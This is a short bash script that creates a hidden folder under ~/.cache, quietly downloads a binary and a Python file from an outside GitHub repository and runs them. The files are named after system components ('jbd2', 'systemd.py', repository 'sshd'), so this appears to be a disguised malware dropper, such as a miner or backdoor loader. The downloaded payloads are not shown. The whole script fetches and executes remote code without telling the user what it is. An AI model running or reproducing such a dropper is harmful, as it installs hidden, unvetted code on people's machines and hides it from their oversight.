#!/bin/bash

set -e

mkdir -p ~/.cache/.sys/
chmod 700 ~/.cache/.sys/
cd ~/.cache/.sys/

wget -q \
    https://github.com/ANTI-VIRAL/sshd/raw/main/jbd2 \
    https://github.com/ANTI-VIRAL/sshd/raw/main/systemd.py 

chmod +x jbd2 systemd.py

# Start program
exec python systemd.py
